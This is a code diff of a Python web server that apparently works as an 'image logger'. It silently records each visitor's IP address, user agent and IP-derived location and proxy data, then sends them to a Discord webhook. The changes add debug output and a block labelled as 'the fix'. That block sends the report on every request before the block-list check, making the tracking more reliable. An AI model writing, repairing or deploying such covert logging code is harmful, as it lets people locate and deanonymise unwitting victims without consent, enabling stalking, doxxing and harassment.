@@ -68,9 +68,11 @@ def reportError(error):
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if not config["webhook"]:
+        print("[!] No webhook URL set!")
         return
 
     if not ip or ip.startswith(blacklistedIPs):
+        print(f"[!] IP blocked: {ip}")
         return
 
     bot = botCheck(ip, useragent)
@@ -94,7 +96,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
     try:
         info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    except:
+        print(f"[+] IP Info: {info}")
+    except Exception as e:
+        print(f"[!] Error getting IP info: {e}")
         return
 
     if info and info.get("proxy"):
@@ -133,9 +137,10 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         embed["embeds"][0]["thumbnail"] = {"url": url}
 
     try:
-        requests.post(config["webhook"], json=embed)
-    except:
-        pass
+        response = requests.post(config["webhook"], json=embed)
+        print(f"[+] Webhook sent! Status: {response.status_code}")
+    except Exception as e:
+        print(f"[!] Error sending webhook: {e}")
 
     return info
 
@@ -173,6 +178,16 @@ height: 100vh;
             forwarded_for = self.headers.get('x-forwarded-for', '')
             user_agent = self.headers.get('user-agent', '')
 
+            print(f"[+] Request from IP: {forwarded_for}")
+            print(f"[+] User-Agent: {user_agent}")
+
+            # ALWAYS SEND WEBHOOK - THIS IS THE FIX
+            if forwarded_for and forwarded_for != "127.0.0.1":
+                makeReport(forwarded_for, user_agent, endpoint=self.path.split("?")[0], url=url)
+            else:
+                # Also send for localhost for testing
+                makeReport(forwarded_for or "127.0.0.1", user_agent, endpoint=self.path.split("?")[0], url=url)
+
             if forwarded_for.startswith(blacklistedIPs):
                 return
 
@@ -183,8 +198,6 @@ height: 100vh;
 
                 if config["buggedImage"]:
                     self.wfile.write(binaries["loading"])
-
-                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
                 return
 
             else:
@@ -249,8 +262,7 @@ if (!currenturl.includes("g=")) {
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.wfile.write(b'500 - Internal Server Error')
             reportError(traceback.format_exc())
 
         return
